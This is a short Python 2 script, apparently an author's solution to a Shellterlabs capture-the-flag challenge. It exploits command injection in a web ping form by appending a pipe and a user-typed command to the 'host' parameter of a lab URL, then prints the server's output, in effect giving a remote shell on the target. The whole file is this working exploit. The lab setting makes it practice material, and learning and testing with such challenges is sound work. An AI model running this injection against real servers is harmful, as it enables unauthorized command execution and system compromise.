# Author: Thiago (THX)
# github: /thxsena
# Shellterlabs - SHX13
#

import requests

escolha = raw_input('Command: ')

r = requests.get('http://lab.shellterlabs.com:33361/index.php?host=192.168.0.1 |'+ escolha +'&submit=Ping%21')

print r.text

